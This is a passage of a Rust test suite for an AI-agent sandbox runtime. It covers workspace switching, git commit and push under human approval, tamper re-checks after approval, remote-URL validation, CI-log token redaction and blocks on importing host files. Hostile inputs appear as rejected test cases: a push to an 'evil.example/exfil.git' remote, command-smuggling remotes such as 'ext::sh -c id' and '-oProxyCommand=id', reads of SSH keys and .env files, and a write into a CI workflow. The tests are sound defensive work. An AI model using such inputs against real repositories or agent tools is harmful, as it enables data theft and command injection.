                        "fs_export_file",
                        json!({
                            "src_path": "$TMPDIR/benign.txt",
                            "dst_host_path": bad_dst.display().to_string()
                        }),
                    )
                    .await
                    .is_err(),
                "must reject export to {}",
                bad_dst.display()
            );
        }
    }

    #[tokio::test]
    async fn test_umbrella_detection_does_not_hijack_paper_dir() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let ws_root = temp.path().join("workspace");
        let repo_a = ws_root.join("aegis-os");
        let sylva = ws_root.join("SYLVA");
        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
        std::fs::create_dir_all(sylva.join("paper")).unwrap();
        std::fs::write(sylva.join("paper/main.tex"), "\\documentclass{article}\n").unwrap();

        assert!(AegisRuntimeKernel::is_umbrella_parent_dir(&ws_root));
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&repo_a));
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&sylva));

        // Even if a directory has a nested `.git` child, having a top-level README.md means it's a project, not an umbrella.
        let docs_with_subrepo = temp.path().join("docs_proj");
        std::fs::create_dir_all(docs_with_subrepo.join("sub/.git")).unwrap();
        std::fs::write(docs_with_subrepo.join("README.md"), "# Docs\n").unwrap();
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&docs_with_subrepo));

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        // Write a stale global active_workspace.txt pointing to `aegis-os`.
        std::fs::write(
            runtime_root.join("active_workspace.txt"),
            repo_a.display().to_string(),
        )
        .unwrap();

        let key_sylva = aos_core::session::SessionKey {
            pid: 5555,
            start_time: 100,
        };
        let resolved_sylva = kernel.resolve_workspace_for_session(&sylva, Some(&key_sylva));
        assert_eq!(
            resolved_sylva,
            std::fs::canonicalize(&sylva).unwrap(),
            "Opening non-Git paper directory SYLVA must never hijack to aegis-os"
        );

        // Session bound inside umbrella root with workspace_switched=true keeps switched target.
        let key_umb = aos_core::session::SessionKey {
            pid: 6666,
            start_time: 200,
        };
        let canon_sylva = std::fs::canonicalize(&sylva).unwrap();
        let canon_ws = std::fs::canonicalize(&ws_root).unwrap();
        aos_core::session::bind_workspace_for_key(
            &runtime_root,
            "agy",
            &key_umb,
            Some("conv-umb"),
            &canon_sylva,
            Some(&canon_ws),
            true,
        );
        assert_eq!(
            kernel.resolve_workspace_for_session(&ws_root, Some(&key_umb)),
            canon_sylva
        );

        // `workspace_switch` from repo_a to SYLVA escalates (outside single-repo scope) and succeeds after approval.
        let agent = AgentIdentity::new("aegis-os", "agy-switch", "Lead");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo_a,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        let ask = kernel
            .call_tool(
                &agent,
                "workspace_switch",
                json!({ "path": sylva.display().to_string() }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(esc_id, 600, "user")
            .await
            .unwrap();
        let switched = kernel
            .call_tool(
                &agent,
                "workspace_switch",
                json!({ "path": sylva.display().to_string() }),
            )
            .await
            .unwrap();
        assert_eq!(switched["status"], "workspace_switched");
        assert_eq!(switched["org_id"], "aegis-os");
        assert_eq!(
            PathBuf::from(switched["host_source_root"].as_str().unwrap()),
            canon_sylva
        );
    }

    #[tokio::test]
    async fn test_multi_repo_workspace_git_inspect_and_auto_commit_shadow_with_repo_arg() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let git_bin = resolve_system_git_binary().expect("system git required for test");
        let temp = tempfile::tempdir().unwrap();
        let parent_dir = temp.path().join("workspace");
        let repo_a = parent_dir.join("repo-a");
        let repo_b = parent_dir.join("repo-b");
        let rt = temp.path().join("rt");

        std::fs::create_dir_all(&repo_a).unwrap();
        std::fs::create_dir_all(&repo_b).unwrap();
        // Top-level README.md ensures parent_dir is treated as a multi-repo project dir, not hijacked as an umbrella.
        std::fs::write(parent_dir.join("README.md"), "# Workspace\\n").unwrap();
        assert!(!AegisRuntimeKernel::is_umbrella_parent_dir(&parent_dir));

        for (repo, file_name) in [(&repo_a, "init_a.txt"), (&repo_b, "init_b.txt")] {
            for args in [
                vec!["init", "-b", "main"],
                vec!["config", "user.name", "Tester"],
                vec!["config", "user.email", "tester@example.com"],
            ] {
                let s: Vec<String> = args.into_iter().map(str::to_string).collect();
                assert!(run_sanitized_host_git(&git_bin, repo, &[], &s)
                    .unwrap()
                    .status
                    .success());
            }
            std::fs::write(repo.join(file_name), "initial\\n").unwrap();
            for args in [
                vec!["add", file_name],
                vec!["commit", "-m", "chore: initial"],
            ] {
                let s: Vec<String> = args.into_iter().map(str::to_string).collect();
                assert!(run_sanitized_host_git(&git_bin, repo, &[], &s)
                    .unwrap()
                    .status
                    .success());
            }
        }

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new(
            aos_core::session::DEFAULT_PERSONAL_ORG_ID,
            "agy-multi",
            "Developer",
        );
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &parent_dir,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let status = kernel
            .call_tool(&agent, "workspace_status", json!({}))
            .await
            .unwrap();
        assert_eq!(
            status["workspace_id"],
            aos_core::session::workspace_id_for_path(
                &std::fs::canonicalize(&parent_dir).unwrap()
            )
        );
        let child_names: Vec<&str> = status["child_repos"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|v| v["name"].as_str())
            .collect();
        assert_eq!(child_names, vec!["repo-a", "repo-b"]);

        let err_no_repo = kernel
            .call_tool(&agent, "workspace_git_inspect", json!({ "mode": "status" }))
            .await
            .unwrap_err()
            .to_string();
        assert!(
            err_no_repo.contains("repo-a") && err_no_repo.contains("repo-b"),
            "unexpected error: {err_no_repo}"
        );

        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "repo-a/hello.txt", "content": "hello from a\\n" }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "repo-b/other.txt", "content": "hello from b\\n" }),
            )
            .await
            .unwrap();

        let inspect_a = kernel
            .call_tool(
                &agent,
                "workspace_git_inspect",
                json!({ "mode": "status", "repo": "repo-a" }),
            )
            .await
            .unwrap();
        assert_eq!(inspect_a["repo"], "repo-a");
        assert_eq!(inspect_a["shadow_uncommitted_files"], json!(["hello.txt"]));

        let ask = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "repo": "repo-a",
                    "auto_commit_shadow": true,
                    "skip_verify": true,
                    "commit_message": "feat: child repo commit"
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(esc_id, 600, "user")
            .await
            .unwrap();

        let git_res = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "repo": "repo-a",
                    "auto_commit_shadow": true,
                    "skip_verify": true,
                    "commit_message": "feat: child repo commit"
                }),
            )
            .await
            .unwrap();
        assert_eq!(git_res["repo"], "repo-a");
        assert_eq!(
            std::fs::read_to_string(repo_a.join("hello.txt")).unwrap(),
            "hello from a\\n"
        );
        assert!(
            !repo_b.join("other.txt").exists(),
            "repo-b host files must stay untouched when committing repo-a"
        );
        let log_out = run_sanitized_host_git(
            &git_bin,
            &repo_a,
            &[],
            &["log".into(), "-1".into(), "--pretty=%s".into()],
        )
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&log_out.stdout).trim(),
            "feat: child repo commit"
        );
    }

    #[tokio::test]
    async fn test_workspace_switch_relative_child_preserves_personal_org_and_isolates_shadows() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let temp = tempfile::tempdir().unwrap();
        let parent_dir = temp.path().join("monorepo");
        let repo_a = parent_dir.join("repo-a");
        let repo_b = parent_dir.join("repo-b");
        let rt = temp.path().join("rt");

        std::fs::create_dir_all(&repo_a).unwrap();
        std::fs::create_dir_all(&repo_b).unwrap();
        std::fs::write(parent_dir.join("README.md"), "# Monorepo\\n").unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new(
            aos_core::session::DEFAULT_PERSONAL_ORG_ID,
            "agy-rel",
            "Developer",
        );
        let env_parent = kernel
            .ensure_agent_environment(
                agent.clone(),
                &parent_dir,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "notes.txt", "content": "uncommitted parent edit\\n" }),
            )
            .await
            .unwrap();

        let sw_a = kernel
            .call_tool(&agent, "workspace_switch", json!({ "path": "repo-a" }))
            .await
            .unwrap();
        assert_eq!(sw_a["status"], "workspace_switched");
        assert_eq!(sw_a["org_id"], aos_core::session::DEFAULT_PERSONAL_ORG_ID);
        assert_eq!(sw_a["previous_uncommitted_count"], 1);
        let canon_parent = std::fs::canonicalize(&parent_dir).unwrap();
        let canon_a = std::fs::canonicalize(&repo_a).unwrap();
        let canon_b = std::fs::canonicalize(&repo_b).unwrap();
        assert_eq!(
            sw_a["workspace_id"],
            aos_core::session::workspace_id_for_path(&canon_a)
        );
        assert_eq!(
            PathBuf::from(sw_a["umbrella_root"].as_str().unwrap()),
            canon_parent
        );

        let sw_b = kernel
            .call_tool(&agent, "workspace_switch", json!({ "path": "repo-b" }))
            .await
            .unwrap();
        assert_eq!(sw_b["status"], "workspace_switched");
        assert_eq!(sw_b["org_id"], aos_core::session::DEFAULT_PERSONAL_ORG_ID);
        assert_eq!(
            sw_b["workspace_id"],
            aos_core::session::workspace_id_for_path(&canon_b)
        );
        assert_eq!(
            PathBuf::from(sw_b["umbrella_root"].as_str().unwrap()),
            canon_parent
        );

        let shadow_parent = env_parent.workspace.shadow_root().to_path_buf();
        let shadow_a = PathBuf::from(sw_a["shadow_root"].as_str().unwrap());
        let shadow_b = PathBuf::from(sw_b["shadow_root"].as_str().unwrap());
        assert_ne!(shadow_parent, shadow_a);
        assert_ne!(shadow_a, shadow_b);
        assert_ne!(shadow_parent, shadow_b);
    }

    #[tokio::test]
    async fn test_binary_org_artifact_source_path_dest_path_and_base64_roundtrip() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_root = temp.path().join("rt");
        let repo = temp.path().join("proj");
        std::fs::create_dir_all(repo.join(".git")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let publisher = AgentIdentity::new("proj", "pub-1", "Publisher");
        let consumer = AgentIdentity::new("proj", "con-1", "Consumer");
        let pub_env = kernel
            .ensure_agent_environment(
                publisher.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        let con_env = kernel
            .ensure_agent_environment(
                consumer.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. `fs_write` + `fs_read` with base64 encoding, and UTF-8 read error on binary file
        let small_bin = vec![0x89u8, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0x00, 0xfe];
        let small_b64 = base64::engine::general_purpose::STANDARD.encode(&small_bin);
        let write_res = kernel
            .call_tool(
                &publisher,
                "fs_write",
                json!({
                    "path": "assets/icon.png",
                    "content": small_b64,
                    "encoding": "base64"
                }),
            )
            .await
            .unwrap();
        assert_eq!(write_res["bytes"], small_bin.len());

        let read_b64 = kernel
            .call_tool(
                &publisher,
                "fs_read",
                json!({ "path": "assets/icon.png", "encoding": "base64" }),
            )
            .await
            .unwrap();
        assert_eq!(read_b64["content_base64"], small_b64);

        let utf8_err = kernel
            .call_tool(&publisher, "fs_read", json!({ "path": "assets/icon.png" }))
            .await
            .unwrap_err()
            .to_string();
        assert!(utf8_err.contains("binary") && utf8_err.contains("fs_export_file"), "{utf8_err}");

        // 2. Large (>32 KiB) binary PNG in $TMPDIR published via `source_path` and fetched via `dest_path`
        let mut large_png = b"\x89PNG\r\n\x1a\n".to_vec();
        large_png.extend(vec![0xffu8; 40_000]);
        std::fs::write(pub_env.sandbox.config().agent_home_dir.join("chart.png"), &large_png)
            .unwrap();

        let meta = kernel
            .call_tool(
                &publisher,
                "org_artifact_publish",
                json!({
                    "name": "chart.png",
                    "source_path": "$TMPDIR/chart.png"
                }),
            )
            .await
            .unwrap();
        assert_eq!(meta["content_type"], "image/png");
        let uri = meta["uri"].as_str().unwrap();

        // Omitting dest_path for large binary avoids lossy multi-KB string dumps
        let fetch_summary = kernel
            .call_tool(&consumer, "org_artifact_fetch", json!({ "uri": uri }))
            .await
            .unwrap();
        assert_eq!(fetch_summary["is_binary"], true);
        assert!(fetch_summary.get("content").is_none());

        // Passing dest_path writes exact raw bytes into consumer's CoW shadow
        let fetch_staged = kernel
            .call_tool(
                &consumer,
                "org_artifact_fetch",
                json!({ "uri": uri, "dest_path": "figures/chart.png" }),
            )
            .await
            .unwrap();
        assert_eq!(fetch_staged["written_to_shadow"], "figures/chart.png");
        assert_eq!(
            std::fs::read(con_env.workspace.shadow_root().join("figures/chart.png")).unwrap(),
            large_png
        );
    }

    #[tokio::test]
    async fn test_workspace_git_commit_tag_push_and_security_guards() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let git_bin = resolve_system_git_binary().expect("system git required for test");
        let temp = tempfile::tempdir().unwrap();
        let origin_bare = temp.path().join("origin.git");
        let host_repo = temp.path().join("repo");
        let rt = temp.path().join("rt");

        assert!(std::process::Command::new(&git_bin)
            .args(["init", "--bare", origin_bare.to_str().unwrap()])
            .status()
            .unwrap()
            .success());
        assert!(std::process::Command::new(&git_bin)
            .args(["init", "-b", "main", host_repo.to_str().unwrap()])
            .status()
            .unwrap()
            .success());

        let run_git = |args: &[&str]| {
            let arg_vec: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let out = run_sanitized_host_git(&git_bin, &host_repo, &[], &arg_vec).unwrap();
            assert!(
                out.status.success(),
                "git {:?} failed: {}",
                args,
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8_lossy(&out.stdout).trim().to_string()
        };

        run_git(&["config", "user.name", "Test User"]);
        run_git(&["config", "user.email", "test@example.com"]);
        run_git(&["remote", "add", "origin", origin_bare.to_str().unwrap()]);
        std::fs::write(host_repo.join("README.md"), "# initial\n").unwrap();
        std::fs::write(host_repo.join("dirty_unrelated.txt"), "clean\n").unwrap();
        run_git(&["add", "README.md", "dirty_unrelated.txt"]);
        run_git(&["commit", "-m", "chore: initial commit"]);
        run_git(&["tag", "v0.4.7"]);
        run_git(&["push", "origin", "main", "refs/tags/v0.4.7"]);

        // Simulate an unrelated dirty file on host that MUST stay untouched by workspace_git.
        std::fs::write(host_repo.join("dirty_unrelated.txt"), "dirty host state\n").unwrap();

        let vault = Arc::new(
            OrgVaultManager::new(&rt).with_mode(aos_vfs::vault::VaultMode::Off),
        );
        let kernel = AegisRuntimeKernel::new_with_vault(&rt, vault).await.unwrap();
        let agent = AgentIdentity::new("repo", "agy-1", "Lead");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "src/fix.rs",
                    "content": "pub fn fixed() -> bool { true }\n"
                }),
            )
            .await
            .unwrap();

        // Guard 1: cannot run workspace_git on files still unmerged in CoW shadow.
        let unmerged_err = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "paths": ["src/fix.rs"],
                    "commit_message": "fix: before commit"
                }),
            )
            .await
            .unwrap_err();
        assert!(
            unmerged_err.to_string().contains("workspace_commit"),
            "{unmerged_err:#}"
        );

        // Land src/fix.rs onto host via workspace_commit.
        let wc_ask = kernel
            .call_tool(&agent, "workspace_commit", json!({ "paths": ["src/fix.rs"] }))
            .await
            .unwrap();
        assert_eq!(wc_ask["status"], "approval_required");
        let wc_esc = wc_ask["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(wc_esc, 0, "user")
            .await
            .unwrap();
        let wc_res = kernel
            .call_tool(&agent, "workspace_commit", json!({ "paths": ["src/fix.rs"] }))
            .await
            .unwrap();
        assert_eq!(wc_res["status"], "committed_to_host");
        let trailer = wc_res["audit_receipt"]["git_trailer"]
            .as_str()
            .unwrap()
            .to_string();

        // Guard 2: raw URL remotes must be rejected.
        let bad_remote = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "push": true,
                    "remote": "https://evil.example/exfil.git"
                }),
            )
            .await
            .unwrap_err();
        assert!(
            bad_remote.to_string().contains("Invalid Git remote name"),
            "{bad_remote:#}"
        );

        // Request commit + trailer + force_tag + push.
        let git_args = json!({
            "paths": ["src/fix.rs"],
            "commit_message": "fix: test host git gateway",
            "trailers": [trailer.clone()],
            "tag": "v0.4.7",
            "force_tag": true,
            "push": true,
            "remote": "origin"
        });
        let ask = kernel
            .call_tool(&agent, "workspace_git", git_args.clone())
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap();
        assert!(rt.join("escalation_diffs").join(format!("{esc_id}.json")).is_file());

        // Approve Once (`ttl_secs = 0`, TOCTOU SHA-256 pinned).
        kernel
            .policy
            .approve_escalation(esc_id, 0, "user")
            .await
            .unwrap();

        // Guard 3 (TOCTOU): modifying host file after approval must invalidate the pinned lease.
        std::fs::write(host_repo.join("src/fix.rs"), "pub fn backdoor() {}\n").unwrap();
        let tampered = kernel
            .call_tool(&agent, "workspace_git", git_args.clone())
            .await
            .unwrap();
        assert_eq!(tampered["status"], "approval_required");

        // Restore exact approved content and re-approve once -> executes commit + force_tag + push.
        std::fs::write(host_repo.join("src/fix.rs"), "pub fn fixed() -> bool { true }\n").unwrap();
        let esc2 = tampered["escalation_id"].as_str().unwrap();
        kernel
            .policy
            .approve_escalation(esc2, 0, "user")
            .await
            .unwrap();

        let done = kernel
            .call_tool(&agent, "workspace_git", git_args)
            .await
            .unwrap();
        assert_eq!(done["status"], "git_completed", "{done}");
        assert_eq!(done["committed"], true);
        assert_eq!(done["pushed"], true);
        let head_sha = done["head_sha"].as_str().unwrap().to_string();
        let pushed_refs = done["pushed_refs"].as_array().unwrap();
        assert!(pushed_refs.iter().any(|v| v == "refs/heads/main"));
        assert!(pushed_refs.iter().any(|v| v == "refs/tags/v0.4.7"));

        // Verify origin bare repo received commit + trailer + moved tag.
        let origin_log = run_sanitized_host_git(
            &git_bin,
            &origin_bare,
            &[],
            &["log".into(), "-1".into(), "--format=%B".into(), "refs/heads/main".into()],
        )
        .unwrap();
        let origin_msg = String::from_utf8_lossy(&origin_log.stdout);
        assert!(origin_msg.contains("fix: test host git gateway"), "{origin_msg}");
        assert!(origin_msg.contains("Aegis-OS-Verified:"), "{origin_msg}");

        let origin_tag = run_sanitized_host_git(
            &git_bin,
            &origin_bare,
            &[],
            &["rev-parse".into(), "refs/tags/v0.4.7".into()],
        )
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&origin_tag.stdout).trim(),
            head_sha
        );

        // Unrelated dirty host file must remain dirty and uncommitted.
        let status_after = run_git(&["status", "--porcelain"]);
        assert!(
            status_after.contains("M dirty_unrelated.txt"),
            "unrelated host file must not be staged: {status_after}"
        );
    }

    #[test]
    fn bootstrap_remote_url_validator_enforces_strict_github_allowlist() {
        assert_eq!(
            validate_bootstrap_remote_url("https://github.com/heurion-org/heurion-doc.git").unwrap(),
            (
                "https://github.com/heurion-org/heurion-doc.git".to_string(),
                "heurion-org/heurion-doc".to_string()
            )
        );
        assert_eq!(
            validate_bootstrap_remote_url("git@github.com:heurion-org/aegis-desktop.git").unwrap(),
            (
                "git@github.com:heurion-org/aegis-desktop.git".to_string(),
                "heurion-org/aegis-desktop".to_string()
            )
        );
        for bad in [
            "http://github.com/heurion-org/heurion-doc.git",
            "file:///tmp/evil",
            "ext::sh -c id",
            "https://user:token@github.com/heurion-org/heurion-doc.git",
            "https://127.0.0.1/heurion-org/heurion-doc.git",
            "https://evil.example/heurion-org/heurion-doc.git",
            "https://github.com/../escape/repo.git",
            "-oProxyCommand=id",
            "",
        ] {
            assert!(
                validate_bootstrap_remote_url(bad).is_err(),
                "must reject unsafe remote url: {bad}"
            );
        }
    }

    #[tokio::test]
    async fn workspace_git_bootstrap_repo_requires_oneshot_approval_and_initializes_child_repo() {
        let tmp = tempfile::tempdir().unwrap();
        let ws = tmp.path().join("umbrella");
        let child = ws.join("new-repo");
        std::fs::create_dir_all(&child).unwrap();
        std::fs::write(child.join(".gitignore"), "ignored.log\n").unwrap();
        std::fs::write(child.join("README.md"), "# New Repo\n").unwrap();
        std::fs::write(child.join("ignored.log"), "secret temp log\n").unwrap();

        let rt = tmp.path().join("rt");
        let vault = Arc::new(
            OrgVaultManager::new(&rt).with_mode(aos_vfs::vault::VaultMode::Off),
        );
        let kernel = AegisRuntimeKernel::new_with_vault(&rt, vault).await.unwrap();
        let agent = AgentIdentity::new("personal", "agy-agent", "Lead");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &ws,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let req = json!({
            "repo": "new-repo",
            "bootstrap_repo": true,
            "bootstrap_remote_url": "https://github.com/heurion-org/demo-doc.git",
            "bootstrap_branch": "main",
            "commit_message": "chore: initial commit"
        });
        let ask = kernel
            .call_tool(&agent, "workspace_git", req.clone())
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        assert!(
            ask["reason"]
                .as_str()
                .unwrap()
                .contains("bootstrap_repo:heurion-org/demo-doc"),
            "{ask}"
        );

        let esc_id = ask["escalation_id"].as_str().unwrap();
        // Approve with non-zero TTL; policy must force LeaseKind::OneShot.
        let lease = kernel
            .policy
            .approve_escalation(esc_id, 3600, "user")
            .await
            .unwrap();
        assert_eq!(lease.kind, LeaseKind::OneShot);

        let done = kernel
            .call_tool(&agent, "workspace_git", req)
            .await
            .unwrap();
        assert_eq!(done["status"], "git_completed", "{done}");
        assert_eq!(done["bootstrapped"], true);
        assert!(child.join(".git").exists());

        let git_bin = resolve_system_git_binary().unwrap();
        let origin = run_sanitized_host_git(
            &git_bin,
            &child,
            &[],
            &["remote".into(), "get-url".into(), "--".into(), "origin".into()],
        )
        .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&origin.stdout).trim(),
            "https://github.com/heurion-org/demo-doc.git"
        );
        let files = run_sanitized_host_git(
            &git_bin,
            &child,
            &[],
            &["ls-files".into()],
        )
        .unwrap();
        let tracked = String::from_utf8_lossy(&files.stdout);
        assert!(tracked.contains("README.md"), "{tracked}");
        assert!(!tracked.contains("ignored.log"), "{tracked}");

        // Never overwrite an already-configured origin via bootstrap_repo.
        let overwrite_err = kernel
            .call_tool(
                &agent,
                "workspace_git",
                json!({
                    "repo": "new-repo",
                    "bootstrap_repo": true,
                    "bootstrap_remote_url": "https://github.com/heurion-org/other.git"
                }),
            )
            .await
            .unwrap_err();
        assert!(
            overwrite_err
                .to_string()
                .contains("Refusing to overwrite existing 'origin'"),
            "{overwrite_err:#}"
        );
    }

    #[tokio::test]
    async fn test_github_ci_inspect_repo_resolution_validation_and_token_redaction() {
        let tmp = tempfile::tempdir().unwrap();
        let https_repo = tmp.path().join("https_repo");
        std::fs::create_dir_all(https_repo.join(".git")).unwrap();
        std::fs::write(
            https_repo.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/heurion-org/aegis-os.git\n",
        )
        .unwrap();
        assert_eq!(
            detect_github_repo_from_git_config(&https_repo).as_deref(),
            Some("heurion-org/aegis-os")
        );

        let ssh_repo = tmp.path().join("ssh_repo");
        std::fs::create_dir_all(ssh_repo.join(".git")).unwrap();
        std::fs::write(
            ssh_repo.join(".git/config"),
            "[remote \"origin\"]\n\turl = git@github.com:heurion-org/aegis-os.git\n",
        )
        .unwrap();
        assert_eq!(
            detect_github_repo_from_git_config(&ssh_repo).as_deref(),
            Some("heurion-org/aegis-os")
        );

        assert!(is_valid_github_repo_slug("heurion-org/aegis-os"));
        assert!(!is_valid_github_repo_slug("../etc/passwd"));
        assert!(!is_valid_github_repo_slug("owner/repo?foo=bar"));
        assert!(!is_valid_github_repo_slug("-bad/repo"));
        assert!(is_valid_ci_branch_name("main"));
        assert!(is_valid_ci_branch_name("feat/ci-fix_1"));
        assert!(!is_valid_ci_branch_name("main&per_page=99"));
        assert!(!is_valid_ci_branch_name("--flag-smuggle"));

        let raw_log = "2026-11-16 curl -H 'Authorization: Bearer s3cr3tTok3nValu3' https://api.github.com\n\
                       TOKEN=ghp_1234567890abcdefghijklmnoprstuv\n\
                       PAT=github_pat_11AAAAA0123456789abcdef\n\
                       OK_LINE=cargo test passed (中文)\n";
        let scrubbed = redact_ci_log_secrets(raw_log);
        assert!(!scrubbed.contains("s3cr3tTok3nValu3"), "{scrubbed}");
        assert!(!scrubbed.contains("ghp_1234567890"), "{scrubbed}");
        assert!(!scrubbed.contains("github_pat_11"), "{scrubbed}");
        assert!(scrubbed.contains("Bearer [REDACTED_BY_AEGIS_DLP]"), "{scrubbed}");
        assert!(scrubbed.contains("TOKEN=[REDACTED_BY_AEGIS_DLP]"), "{scrubbed}");
        assert!(scrubbed.contains("OK_LINE=cargo test passed (中文)"), "{scrubbed}");

        let (tailed, total, truncated) = tail_ci_lines("l1\nl2\nl3\nl4", 2);
        assert_eq!(total, 4);
        assert!(truncated);
        assert_eq!(tailed, "l3\nl4");

        // Reject invalid explicit repo slug cleanly without hitting network.
        let bad_err = execute_github_ci_inspect(&https_repo, &json!({ "repo": "evil/a/b" }))
            .await
            .unwrap_err();
        assert!(bad_err.to_string().contains("Invalid GitHub repository slug"));

        // Verify Cedar baseline policy auto-permits `github_ci_inspect` for same-org agent.
        let policy = AegisPolicyKernel::new();
        let decision = policy
            .evaluate(&PolicyContext {
                principal: AgentIdentity::new("aegis-os", "agy-agent", "Lead"),
                action: "github_ci_inspect".to_string(),
                target_org_id: "aegis-os".to_string(),
                target_resource: "/workspace".to_string(),
                metadata: json!({}),
            })
            .await
            .unwrap();
        assert!(
            matches!(decision, PolicyDecision::Allow { .. }),
            "expected Cedar auto-permit for github_ci_inspect, got {decision:?}"
        );
    }

    #[tokio::test]
    async fn test_fs_import_file_modes_guards_and_toctou_pinning() {
        std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        let tmp = tempfile::tempdir().unwrap();
        let rt = tmp.path().join("rt");
        let repo = tmp.path().join("repo");
        let external = tmp.path().join("external");
        let cred_dir = external.join(".ssh");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::create_dir_all(&cred_dir).unwrap();
        std::fs::write(cred_dir.join("id_ed25519"), "SECRET_KEY").unwrap();
        std::fs::write(external.join(".env.production"), "DB_PASS=123").unwrap();
        let spec_file = external.join("spec.md");
        std::fs::write(&spec_file, "design notes v1\ntoken=ghp_1234567890abcdefgh\n").unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(&spec_file, external.join("link_spec.md")).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt).await.unwrap());
        let agent = AgentIdentity::new("aegis-os", "coder-1", "Engineer");
        let env = kernel
            .ensure_agent_environment(
                agent.clone(),
                &repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. Credential, dotenv, symlink, and poisoning shadow destination are hard-blocked.
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": cred_dir.join("id_ed25519") })
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": external.join(".env.production") })
            )
            .await
            .is_err());
        #[cfg(unix)]
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({ "src_host_path": external.join("link_spec.md") })
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "fs_import_file",
                json!({
                    "src_host_path": &spec_file,
                    "import_to": "shadow",
                    "dst_path": ".github/workflows/evil.yml"
                })
            )
            .await
            .is_err());

        // 2. Default mode imports into `<agent_home>/imports/` after SHA-256-pinned approval.
        let import_args = json!({ "src_host_path": &spec_file, "dst_path": "docs/spec.md" });
        let ask = kernel
            .call_tool(&agent, "fs_import_file", import_args.clone())
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();
        assert!(rt.join("escalation_diffs").join(format!("{esc_id}.json")).is_file());
        // Preview saved to escalation_diffs must DLP-redact secrets!
        let saved_diff = std::fs::read_to_string(
            rt.join("escalation_diffs").join(format!("{esc_id}.json")),
        )
        .unwrap();
        assert!(!saved_diff.contains("ghp_1234567890"), "{saved_diff}");

        kernel.policy.approve_escalation(&esc_id, 0, "user").await.unwrap();

        // Mutating host file after approval must invalidate OneShot `#sha256:` pin.
        std::fs::write(&spec_file, "tampered bytes!").unwrap();
        let drifted = kernel
            .call_tool(&agent, "fs_import_file", import_args.clone())
            .await
            .unwrap();
        assert_eq!(drifted["status"], "approval_required");
        let esc2 = drifted["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc2, 0, "user").await.unwrap();

        let done = kernel
            .call_tool(&agent, "fs_import_file", import_args)
            .await
            .unwrap();
        assert_eq!(done["status"], "imported_from_host", "{done}");
        assert_eq!(done["import_to"], "imports");
        assert_eq!(
